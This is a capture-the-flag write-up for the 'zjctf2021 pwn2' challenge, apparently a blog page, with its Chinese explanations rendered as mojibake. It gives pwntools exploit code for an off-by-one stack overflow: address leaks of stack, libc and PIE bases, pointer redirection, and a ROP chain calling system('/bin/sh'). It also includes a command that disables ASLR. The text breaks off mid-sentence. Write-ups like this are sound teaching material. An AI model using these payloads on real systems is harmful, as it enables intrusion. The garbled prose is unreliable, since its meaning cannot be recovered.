æ­¤æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªåˆ¤æ–­æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸ªåˆ¤æ–­çš„æ„æ€å°±æ˜¯æˆ‘ä»¬çš„æŒ‡é’ˆåªæœ‰åœ¨&gt;=ç¼“å†²åŒºåœ°å€æˆ–è€…&lt;=rbp-0x220æ‰å…è®¸æ‰§è¡Œä¸‹é¢çš„æµç¨‹ã€‚å› ä¸ºæ ˆæ˜¯å‘ä½åœ°å€å¢é•¿ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªåˆ¤æ–­å°±æ˜¯ptrè¦è½åœ¨bufæˆ–è€…bufä¸‹é¢(æ ˆåº•æ–¹å‘)ã€‚å¦‚æœæˆ‘ä»¬æœ‰æœºä¼šä¿®æ”¹ptrï¼Œé‚£ç¡®å®å¯ä»¥é€šè¿‡pträ»»æ„å†™ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰åˆ†æçš„æ˜¯ä¸èƒ½é€šè¿‡mainå‡½æ•°æº¢å‡ºï¼Œæ‰€ä»¥å¾€åé¢å†™æ²¡å¤šå¤§ç”¨å¤„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹ç¬¬äºŒä¸ªæ¡ä»¶ã€‚æ„æ€å¤§æ¦‚å°±æ˜¯å¦‚æœä¸åœ¨bufä¸‹é¢ï¼Œé‚£ä¹ˆåœ¨ä¸Šé¢ä¹Ÿè¦ç¦»bufæœ‰ä¸€å®šè·ç¦»ï¼Œè¿™ä¸ªè·ç¦»æ˜¯rbp-0x220ï¼Œç„¶åbufæœ€é¡¶ç«¯è·ç¦»rbpæ˜¯0x120ï¼Œæ‰€ä»¥æŒ‡é’ˆä¸èƒ½è½åœ¨(buf-0x100,buf)èŒƒå›´å†…å› ä¸ºåˆ¤è¿‡æœ‰ç­‰å·ï¼Œæ‰€ä»¥åˆ¤ä¸è¿‡è‡ªç„¶æ˜¯å¼€åŒºé—´ã€‚</p><p>sizeåªèƒ½0x100ä»¥å†…ï¼Œè§‚å¯Ÿç±»å‹å‘ç°åˆ¤æ–­çš„æ—¶å€™ç±»å‹ä¸ºunsignedï¼Œä¸èƒ½è´Ÿæº¢ã€‚é‚£ä¹ˆè¿›å…¥myputsï¼Œmyreadå’ŒmywriteæŸ¥çœ‹ã€‚</p><p>myputsï¼šå•ä¸ªå­—ç¬¦è¾“å‡ºï¼Œé‡åˆ°\0åœæ­¢è¾“å‡ºã€‚</p><p>mywriteï¼šå›ºå®šé€å­—èŠ‚è¾“å‡ºé‚£ä¹ˆé•¿çš„å­—èŠ‚åºåˆ—ã€‚</p><p>myreadï¼šä¹Ÿæ˜¯é€å­—èŠ‚è¯»å…¥é‚£ä¹ˆé•¿çš„åºåˆ—ï¼Œå¹¶ä¸”while  read(1)è¡¨ç¤ºå¿…é¡»è¦è¯»é‚£ä¹ˆå¤šçš„å­—èŠ‚ï¼Œä½†æ˜¯æ³¨æ„ä»–å¾ªç¯æ˜¯ä»0ï¼Œç„¶åå¯¹sizeåˆ¤æ–­çš„æ—¶å€™åŠ äº†ç­‰å·ï¼Œè¿™å°±æ„å‘³ç€èƒ½å¤Ÿå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off by oneã€‚</p><p>bufè·ç¦»ptråˆšå¥½0x100å­—èŠ‚ï¼Œå¦‚æœæº¢å‡ºä¸€ä¸ªå­—èŠ‚é‚£ä¹ˆå¯ä»¥æº¢å‡ºä¸€ä¸ªè¾ƒå¤§å­—èŠ‚ï¼Œä½¿å¾—ç­‰ä¼šé€šè¿‡è¿™ä¸ªæŒ‡é’ˆè¾“å‡ºçš„æ—¶å€™èƒ½å¤Ÿè¾“å‡ºåé¢çš„æ ˆå†…å®¹ã€‚</p><h2 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h2><p>æˆ‘ä»¬é€šè¿‡ä¹‹å‰åˆ†æçš„å†…æ„é€ ä»¥ä¸‹å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span><span class="comment">#libcä¸­å¯»æ‰¾çš„</span></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/2.png" alt="2"></p><p>å¯ä»¥çœ‹åˆ°åé¢è¾“å‡ºäº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯å› ä¸ºæ ˆä¸å­˜åœ¨å†…å­˜é¡µå¯¹é½çš„è¯´æ³•ï¼Œæ‰€ä»¥æœ€åä¸€ä¸ªå­—èŠ‚æ”¹å¤§ä¹‹åèƒ½è¾“å‡ºå¤šå°‘ä¸œè¥¿å…¨å‡­è¿æ°”ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥ä¹‹åç”¨gdb attachå»æŸ¥çœ‹æ­¤æ—¶æ ˆçš„æƒ…å†µçœ‹çœ‹èƒ½æ³„éœ²ä»€ä¹ˆä¸œè¥¿ã€‚ç”±äºæ²¡æœ‰å»ç¬¦å·è¡¨ï¼Œå› æ­¤ä¸ºäº†æ–¹ä¾¿å®šä½ä»£ç æˆ‘ä»¬ç›´æ¥åœ¨åé¢åŠ ä¸Šb mywriteã€‚</p><p><img src="/2021/11/06/zjctf2021%20pwn2/3.png" alt="3"></p><p>åœˆå‡ºæ¥çš„æ˜¯æŒ‡é’ˆæœ«å°¾è¢«æ”¹äº†çš„æƒ…å†µï¼Œç„¶åä¸‰ä¸ªç®­å¤´æ˜¯å¯ä»¥æ³„éœ²çš„ä¸œè¥¿ï¼Œåˆ†åˆ«èƒ½æ³„éœ²æ ˆï¼Œlibcå’Œç¨‹åºçš„åŠ è½½åŸºå€ã€‚ä½†æ˜¯å¦‚æœbufæœ¬èº«æ‰€åœ¨ä½ç½®çš„æœ€ä½å­—èŠ‚å°±æ˜¯e0,f0ä¹‹ç±»çš„é‚£å¯èƒ½æ³„éœ²ä¸äº†è¿™ä¹ˆå¤šä¸œè¥¿ï¼Œæ‰€ä»¥è¿™ä¸€ç‚¹ä¹Ÿæ˜¯çœ‹è„¸çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¥æ”¶æ³„éœ²çš„æ•°æ®å‘¢ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬ç¬¬ä¸€ä¸ªæ³„éœ²çš„åœ°å€åº”è¯¥æ˜¯ptrï¼Œä½†æ˜¯ptrè¢«æˆ‘ä»¬æ”¹è¿‡ï¼Œæˆ‘ä»¬å¹¶å…·ä½“æ³„éœ²å‡ºè¿™ä¸ªbufåœ¨å“ªä¸ªä½ç½®ã€‚æ‰€ä»¥è¿™ä¸ªæˆ‘ä»¬ä¸è€ƒè™‘ï¼Œæˆ‘ä»¬æ¥å—åé¢çš„æ ˆåœ°å€ï¼Œè®¡ç®—ä¸€ä¸‹æ³„éœ²åœ°å€å’Œbufçš„åç§»å¾—åˆ°bufåœ°å€ã€‚åé¢çš„æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯å¼€äº†pieä¹‹åç¨‹åºåŠ è½½åŸºå€ä¸çŸ¥é“å…·ä½“ä¼šåœ¨å“ªï¼Œä¸è¿‡æ®æˆ‘è§‚å¯Ÿå®ƒå¤§éƒ¨åˆ†é«˜å­—èŠ‚æ˜¯55ï¼Œæœ‰æ—¶å€™æ˜¯56ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä»¥55åˆ¤æ–­å§ã€‚ä½†æ˜¯ä¸ºäº†è°ƒè¯•æ–¹ä¾¿æˆ‘ä»¬é€‰æ‹©å…ˆå…³é—­aslrè°ƒè¯•ï¼Œå…·ä½“ç»†èŠ‚å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>å…³é—­ä¹‹åå¼€äº†aslrçš„ç¨‹åºå›ºå®šåŠ è½½åœ¨0x555555554000ä¸Šé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä»¥å››ä¸ªå­—èŠ‚çš„55æ¥åˆ¤æ–­æ˜¯å¦æœ‰æ²¡æœ‰æ³„éœ²åˆ°ç¨‹åºåŠ è½½åŸºå€ï¼Œç­‰åˆ°æ‰“è¿œç¨‹çš„æ—¶å€™è°ƒå›æ¥å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span><span class="comment">#buf_addr-8</span></span><br><span class="line"><span class="comment">#å› ä¸ºä¸€å¼€å§‹æŒ‡å‘åŠ«æŒè¿™ä¸ªå¿½ç•¥äº†æ¡ä»¶ä¸å…è®¸ï¼Œè¿™é‡Œåˆ°åæ¥ä¹Ÿæ²¡æ”¹ï¼Œé—®é¢˜ä¸å¤§ï¼Œä¹‹ååœ¨å¼•ç”¨è¿™ä¸ªå€¼çš„æ—¶å€™+8å°±å®Œäº‹äº†ã€‚</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span><span class="comment">#libc_base</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>*<span class="number">4</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr<span class="comment">#ç”¨çš„æ˜¯libcçš„gadgetï¼Œç”¨æœ¬èº«çš„gadgetåŠ ä¸Šcode_baseå³å¯</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å…³äº†aslrçš„è°ƒè¯•ç»“æœ</p><p><img src="/2021/11/06/zjctf2021%20pwn2/4.png" alt="4"></p><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>æ³„éœ²äº†è¿™ä¸‰ä¸ªåŸºå€ä¹‹åï¼Œæˆ‘ä»¬å°±è¦è€ƒè™‘åœ¨å“ªé‡ŒåŠ«æŒç¨‹åºæµäº†ã€‚gotè¡¨å› ä¸ºå¼€äº†ä¿æŠ¤æ— æ³•åŠ«æŒï¼Œæˆ‘ä»¬åªèƒ½åŠ«æŒå‡½æ•°ï¼Œå”¯ä¸€å…·æœ‰è¾“å…¥åŠŸèƒ½çš„å°±æ˜¯my_readå‡½æ•°ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯åœ¨è¿™é‡Œæº¢å‡ºã€‚æˆ‘ä»¬ä¹‹å‰è®¨è®ºè¿‡æˆ‘ä»¬çš„ptrèƒ½åŠ«æŒçš„ä½ç½®æ˜¯æœ‰é™åˆ¶çš„ã€‚</p><p>å¦‚æœæˆ‘ä»¬æŠŠæŒ‡é’ˆåˆšå¥½åŠ«æŒåœ¨buf-0x100ï¼Œç„¶åè¯»å…¥0x100å­—èŠ‚çš„æ•°æ®èƒ½å¦æº¢å‡ºå‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºbufæ˜¯mainå‡½æ•°çš„æ ˆé¡¶äº†ï¼Œå†ä¸Šå»å°±æ˜¯å…¶å®ƒå‡½æ•°çš„æ ˆå¸§äº†ï¼Œå°±ç®—è¿™0x100å­—èŠ‚ä¸èƒ½ç¢°åˆ°bufï¼Œé‚£ç¢°åˆ°ä¸Šé¢å‡½æ•°çš„è¿”å›åœ°å€è¿˜æ˜¯å¯ä»¥çš„ã€‚è¿™ä¾¿æ˜¯è¿™é¢˜çš„å·§å¦™ä¹‹å¤„äº†ï¼Œè¿™é‡Œæˆ‘æƒ³äº†å¾ˆä¹…ã€‚ä½†æ˜¯è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ˜¯é€å­—èŠ‚è¾“å…¥çš„ï¼Œå¹¶ä¸æ˜¯ä¸€å£æ°”è¾“å…¥å®Œçš„ï¼Œæ‰€ä»¥é‡Œé¢çš„ä¸€äº›å˜é‡ä¸èƒ½ç ´åã€‚è¿™é‡Œå…·ä½“è¦è‡ªå·±è°ƒè¯•äº†ï¼Œå®ƒä¸­é—´å¥½åƒæœ‰æŠŠå¾ªç¯æˆªæ­¢æ¡ä»¶çš„é‚£ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°æ”¾åˆ°æ ˆä¸Šï¼Œå› ä¸ºæˆ‘è¦†ç›–è¿‡å»ç›´æ¥å°±æ— äº†ï¼Œå¾ªç¯ç›´æ¥é€€å‡ºäº†ã€‚è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯jmp çš„æ—¶å€™ä¹Ÿæœ‰ç”¨åˆ°æ ˆä¸Šçš„åœ°å€è·³è½¬ï¼Œå› ä¸ºæˆ‘ä½¿ç”¨eè¦†ç›–çš„ï¼Œç„¶åæˆ‘é‚£ä¸ªæŒ‡ä»¤ç›´æ¥å°±è·³åˆ°äº†0xXXXXX65çš„åœ°æ–¹ï¼Œç„¶åå°±crashäº†ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹å¤§æ¦‚ç‡æ˜¯è¦æ”¾ä¸Šæ­£ç¡®çš„è·³è½¬åœ°å€çš„ã€‚å› ä¸ºæ˜¯é€å­—èŠ‚å¡«å……ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯è‚¯å®šåŠ«æŒä¸äº†ç¨‹åºçš„ï¼Œæˆ‘ä»¬åªèƒ½å°½é‡ä¸ç ´åå®ƒç¨‹åºçš„æ‰§è¡Œï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡å…¶å®ä¹Ÿå°±å¡«ä¸Šé‚£8ä¸ªå­—èŠ‚å…¶å®ƒæ˜¯ä»€ä¹ˆå…¶å®æ— æ‰€è°“ï¼Œåªè¦èƒ½æˆåŠŸåŠ«æŒé‚£å…«ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°±èƒ½æ§åˆ¶ç¨‹åºæµã€‚</p><h3 id="å¸ƒç½®ropé“¾"><a href="#å¸ƒç½®ropé“¾" class="headerlink" title="å¸ƒç½®ropé“¾"></a>å¸ƒç½®ropé“¾</h3><p>è¿™é¢˜å¯ä»¥æ‰§è¡Œsystem(â€œ/bin/shâ€)ï¼Œå› æ­¤æˆ‘ä»¬å…ˆæ„é€ ropé“¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+p64(pop_rdi_ret)+p64(sh)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>pop_rdi_retçš„gadgetå¯ä»¥ä½¿ç”¨elfçš„ï¼Œä¹Ÿå¯ä»¥ç”¨åº“çš„ï¼Œè¿™ä¸ªçœ‹è‡ªå·±å¿ƒæƒ…ï¼Œæˆ‘å› ä¸ºä¸€å¼€å§‹æ²¡æœ‰é€‰æ‹©æ¥å—ç¨‹åºåŸºå€å°±é€‰æ‹©äº†libcçš„gadgetã€‚å› ä¸ºæˆ‘ä»¬åªèƒ½åŠ«æŒå…«ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæ‰§è¡Œäº†pop_rdi_retä¹‹åç¨‹åºretåˆ°å“ªé‡Œäº†å‘¢ï¼Œæˆ‘ä»¬å…ˆç”»å‡ºå½“æ—¶æ•´ä¸ªæ ˆç»“æ„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i</span><br><span class="line">main&#x27;s rbp</span><br><span class="line">ret_addr</span><br><span class="line">buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr</span><br><span class="line">size</span><br><span class="line">canary</span><br><span class="line">libc_start_main&#x27;s rbp</span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿”å›åœ°å€åé¢ç´§è·Ÿç€çš„å°±æ˜¯bufï¼Œbufæˆ‘ä»¬ä¸€å¼€å§‹æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯ä¸€å¼€å§‹æˆ‘ä»¬å¹¶ä¸çŸ¥é“systemå’Œ/bin/shçš„åœ°å€ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦é€‰æ‹©æŠŠæŒ‡é’ˆæ¢å¤å¡«ä¸Šp64(sh)+p64(system_addr)ï¼Œè¿™æ ·å½“åŠ«æŒmy_readå‡½æ•°çš„æ—¶å€™å°±ä¼šå½¢æˆropé“¾ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥è¦å¦‚ä½•æŠŠæŒ‡é’ˆåŠ«æŒå›å»å‘¢ï¼Œå› ä¸ºæˆ‘ä»¬ç”¨çš„æ˜¯\xffå­—èŠ‚å»å¡«å……äº†æœ€ä½ä½ï¼Œç°åœ¨æˆ‘ä»¬å¦‚æœå†™ï¼Œå°†ä¸ä¼šä»bufçš„åœ°æ–¹å¼€å§‹è€Œæ˜¯ä¼šä»(buf_addr|0xff)ï¼Œè¿™ä¹Ÿæ˜¯ä¸€å¼€å§‹é€‰å–\xffå­—èŠ‚çš„ç›®çš„ï¼Œå› ä¸ºå®ƒå…«ä¸ªéƒ½æ˜¯1ï¼Œåœ¨æœ€åè®¡ç®—çš„æ—¶å€™ç›´æ¥æˆ–ä¸Šå»å°±å¯ä»¥äº†ï¼Œå¦‚æœé€‰å–å…¶å®ƒçš„å¯èƒ½å°±è¦è¿›è¡Œä¸€äº›å¤æ‚çš„è¿ç®—ï¼Œæ¯”å¦‚\xfeå­—èŠ‚ä½ å¯èƒ½å°±å¾—è¿™ä¹ˆå†™ã€‚</p><p>(buf_addr&amp;0xffffffffff00)|0xfe</p><p>è¿™ä¸ªåº”è¯¥éƒ½èƒ½ç†è§£å§ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯è¦†ç›–æ“ä½œï¼Œä½†æ˜¯å¦‚æœè¦†ç›–ä½æ•°éƒ½ä¸º1å°±å¯ä»¥ç›´æ¥æˆ–ä¸Šå»ï¼Œä¸ç”¨å†&amp;æ¸…é™¤ä½ä½å­—èŠ‚ã€‚</p><p>è€Œæˆ‘ä»¬çš„ç›®æ ‡åœ°å€åœ¨buf_addr+0x100ï¼Œæ‰€ä»¥åªéœ€è¦ç®—è¿™ä¸ªåç§»å°±è¡Œäº†ã€‚è¿™åç§»ä¹Ÿæ˜¯å¾ˆå¥½ç®—çš„ï¼Œæˆ‘ä»¬ä»buf_addr|0xffå¼€å§‹å†™ï¼Œç„¶åç»ˆç‚¹æ˜¯buf_addr+0x100ï¼Œä¸¤ä¸ªä¸€å‡å°±èƒ½ç®—å‡ºå¡«å……å­—èŠ‚çš„ä½æ•°äº†ï¼Œç„¶åå†åŠ ä¸Šbuf_addræŒ‡é’ˆç»™ä»–å†™å›å»ã€‚å¥½äº†ä¹‹åå‘¢ï¼Œå°±æ˜¯å¼€å¤´æ”¾ä¸Šp64(sh)+p64(system_addr)ç„¶åä¾ç„¶è¦æº¢å‡ºffå­—èŠ‚ï¼Œä¸ç„¶åªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ä¸è¶³ä»¥èƒ½è‚¯å®šæ”¹å˜æŒ‡é’ˆåˆ°æˆ‘ä»¬æƒ³çš„åœ°æ–¹ã€‚æ‰€ä»¥é‡å¤ä¸€å¼€å§‹çš„æ“ä½œæº¢å‡ºä¸º0xffï¼Œç„¶åå†åŠ«æŒåˆ°buf_addr-0x100çš„åœ°æ–¹å»ã€‚</p><p>æ”¹å›æŒ‡é’ˆå¹¶ä¸”é‡å†™å†æ¬¡æº¢å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))<span class="comment">#å†æ¬¡æ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘çš„stack_addræ˜¯buf_addr-8</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)<span class="comment">#è¿™é‡Œéœ€è¦åŠ ä¸ªretå¹³è¡¡æ ˆï¼Œåé¢æ³¨æ„åˆ°äº†å°±çŸ¥é“åœ¨è¿™é‡ŒåŠ ä¸€ä¸ªå°±è¡Œ</span></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))<span class="comment">#å°±è·Ÿæ”¹å›æ¥æ˜¯ä¸€æ ·çš„ï¼Œæˆªå›¾å¹¶æœªæ‰§è¡Œåˆ°è¿™é‡Œ</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/5.png" alt="5"></p><h3 id="åŠ«æŒmy-read"><a href="#åŠ«æŒmy-read" class="headerlink" title="åŠ«æŒmy_read"></a>åŠ«æŒmy_read</h3><p>ä¸€å¼€å§‹å¯èƒ½æƒ³çš„ä¼šæœ‰ç‚¹ç®€å•ï¼Œç›´æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0xff</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xf8</span>+p64(pop_rdi_ret))<span class="comment">#ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ªå¡«å……å­—ç¬¦é€‰çš„åˆ°ä½ï¼Œå¯¼è‡´èƒ½å¿«é€Ÿæ‰¾å‡ºé”™è¯¯ï¼Œæ‰€ä»¥å¦‚æœç¨‹åºé€€å‡ºå¼‚å¸¸ä½†è¿˜èƒ½ç»§ç»­æ‰§è¡Œä¸å¦¨æ”¹ä¸€ä¸‹å¡«å……å­—ç¬¦å“¦</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šå‘ç°ç¨‹åºç›´æ¥æ­»äº†ï¼Œè¿™é‡Œå°±æ¥å¤åŸä¸€ä¸‹æˆ‘å¤ç›˜æ—¶å‡ºçš„é—®é¢˜ï¼Œå…ˆç”¨è¿™ä¸ªæœ€ç®€å•çš„payloadè¯•è¯•çœ‹é—®é¢˜å‡ºåœ¨å“ªé‡Œã€‚</p><p><img src="/2021/11/06/zjctf2021%20pwn2/6.png" alt="6"></p><p>ä¼šå‘ç°è¿™ä¸ªæŒ‡ä»¤éå¸¸å¥‡å¥‡æ€ªæ€ªï¼Œè€Œä¸”ripæ­¤æ—¶æœ€ä½é‚£ä¸ªå­—èŠ‚çš„å€¼æ˜¯65åˆšå¥½å°±æ˜¯eçš„ASCIIç ï¼Œå†disassä¸€ä¸‹å‘ç°è¿™ä¸ªå‡½æ•°æ ¹æœ¬æ²¡æœ‰æŒ‡åˆ°è¿™ä¸ªä½ç½®ä¸Šçš„æŒ‡ä»¤ï¼Œå¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“ï¼Œè¿™æ¡æŒ‡ä»¤æ˜¯è¢«åˆ†å‰²äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å›æº¯æ ˆçœ‹çœ‹ï¼Œå‘ç°æˆ‘ä»¬è¦†ç›–äº†ä»€ä¹ˆå¯¼è‡´è¿™ä¸ªé—®é¢˜ã€‚å¯ä»¥çœ‹åˆ°æ¬¡æ—¶içš„å€¼å°±æ˜¯0xb8ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è°ƒè¯•åˆ°i=0xb7çš„æ—¶å€™ï¼Œè§‚å¯Ÿæ¥ä¸‹æ¥è¦è¦†ç›–çš„å€¼æ˜¯ä»€ä¹ˆã€‚</p><p><img src="/2021/11/06/zjctf2021%20pwn2/7.png" alt="7"></p><p>å¯ä»¥å‘ç°æ¥ä¸‹æ¥è¦è¦†ç›–çš„å­—èŠ‚åº”è¯¥å°±æ˜¯ä¸¤ä¸ªç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹ï¼Œè€Œå³è¾¹è¿™é‡Œåˆšå¥½æœ‰ä¸€ä¸ªåœ¨ç¨‹åºçš„codeæ®µçš„åœ°å€ï¼ŒçŒœæµ‹åˆšåˆšåº”è¯¥æ˜¯è¦†ç›–äº†è¿™é‡Œçš„æœ€ä½ä½å¯¼è‡´çš„é—®é¢˜ã€‚å¹¶ä¸”æˆ‘ä»¬åˆšåˆšçš„ripé”™è¯¯æŒ‡å‘å°±æ˜¯0x555555555365ï¼Œåˆšå¥½å°±æ˜¯é‚£ä¸ªåœ°å€ä½å­—èŠ‚è¦†ç›–äº†0x65å­—èŠ‚å¯¼è‡´çš„é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆæ¥è§‚å¯Ÿä¸€ä¸‹è¿™ä¸ªåœ°å€åœ¨å“ªé‡Œã€‚</p><p><img src="/2021/11/06/zjctf2021%20pwn2/8.png" alt="8"></p><p>å¯ä»¥å‘ç°åˆšå¥½åœ¨myreadä¸­æœ‰è¿™ä¹ˆä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆçœ‹åˆ°å®ƒåœ¨readå‡½æ•°ä¸‹é¢åº”è¯¥èƒ½æƒ³åˆ°ï¼Œè¿™ä¸ªæ˜¯åœ¨è°ƒç”¨readçš„æ—¶å€™ä¿å­˜çš„è¿”å›åœ°å€ï¼Œè¯»å®Œä¹‹åæ”¹å˜äº†è¿™ä¸ªè¿”å›åœ°å€å¯¼è‡´äº†å‡ºç°è¿™ä¸ªé”™è¯¯ã€‚å› ä¸ºåœ¨è¿™é‡Œè°ƒç”¨readè¿”å›åœ°å€è‚¯å®šçŸ¥é“å°±æ˜¯åœ¨å‡½æ•°çš„è¿™ä¸ªä½ç½®ï¼Œé‚£ä¹ˆå®ƒåœ¨code_baseä¸Šåç§»æ˜¯å›ºå®šçš„ï¼Œç®—å‡ºåç§»ä¹‹åè¿™ä¸ªåœ°æ–¹çš„8ä¸ªå­—èŠ‚å°±å›ºå®šå¡«å†™è¿™ä¸ªä¸è¦æ”¹å˜äº†ã€‚æ­¤æ—¶æˆ‘ä»¬çš„payloadå˜æˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)).ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(pop_rdi_ret)</span><br><span class="line">read(<span class="number">0xff</span>,payload)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°æ‰§è¡Œç€çªç„¶é€€å‡ºäº†ï¼Œè€Œå½“æ—¶içš„å€¼è¿˜æ˜¯0xc8</p><p><img src="/2021/11/06/zjctf2021%20pwn2/9.png" alt="9"></p><p>åˆ°åº•æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œåº”è¯¥èƒ½ç¨å¾®çŒœåˆ°ä¸€ç‚¹ï¼Œå› 